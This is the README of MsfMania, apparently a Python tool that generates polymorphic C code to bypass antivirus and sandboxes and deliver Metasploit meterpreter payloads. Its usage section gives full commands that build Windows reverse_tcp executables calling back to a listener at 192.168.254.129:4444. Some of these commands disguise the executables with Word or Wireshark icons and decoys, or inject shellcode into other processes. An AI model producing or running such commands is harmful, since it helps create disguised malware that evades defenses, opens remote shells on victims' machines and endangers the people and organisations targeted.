# MsfMania

MsfMania is a command line tool developed in Python, allowing to automatically produce a source code in C language that will be used to bypass antimalware before executing a metasploit payload.

## Version 2.1
New features:
```
1- New usage method
2- Perfomance increase
3- User interaction removed
4- Hardest loop usage removed
```

## Requirements
- Latest version of Kali Linux
- The kali-rolling repository
- Python3

## Installation
- Git clone this repository: ```git clone https://github.com/G1ft3dC0d3/MsfMania.git```
- cd into the MsfMania folder: ```cd MsfMania```
- Run MsfMania setup: ```python3 setup.py```

## Usage
```
python3 MsfMania.py -h
```
```
python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Malware local
```
```
python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Virus remote --procname Wireshark.exe --mscript --icon mco.ico
```
```
python3 MsfMania.py stageless x64 windows/x64/meterpreter_reverse_tcp 192.168.254.129 4444 Word remote --decoy 2000 --mscript --icon word.ico
```

## Features
- x86/x64 staged/stageless windows payload meterpreter/shell.
- Cross-compiler MinGW.
- Polymorphic C source code.
- Strip with MinGW.
- Rar compression.
- Executable customizable with an icon.
- Local/Remote Thread Shellcode Injection
- Sandbox/Antivirus Evasion
